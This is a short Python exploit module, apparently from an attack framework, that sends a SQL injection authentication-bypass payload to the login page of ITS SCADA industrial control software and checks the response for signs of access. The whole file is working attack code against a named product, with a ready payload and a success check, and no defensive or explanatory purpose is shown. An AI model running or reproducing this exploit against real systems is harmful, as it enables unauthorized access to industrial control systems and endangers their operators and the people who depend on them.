import requests
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target: str, port: int = 80):
    """
    Exploit Title: ITS SCADA SQL Injection â€“ Authentication Bypass
    Source: BID 43680
    Author: Eugene Salov
    Exploit Type: SQL Injection
    Affected: ITS SCADA login form
    """

    url = f"http://{target}:{port}/login.php"
    payload = {
        "username": "1' or 1=(select top 1 password from Users)--",
        "password": ""
    }

    try:
        logger.info(f"[*] Sending SQL injection payload to {url}")
        response = requests.post(url, data=payload, timeout=5)

        if "dashboard" in response.text.lower() or "logout" in response.text.lower():
            logger.success("[+] SQL injection successful: Access granted to ITS SCADA")
            return True
        elif response.status_code == 200:
            logger.warning("[-] Response received, but SQLi payload might not have worked")
        else:
            logger.warning(f"[-] Unexpected status code: {response.status_code}")
    except Exception as e:
        logger.error(f"[!] ITS SCADA SQLi error: {e}")

    return False
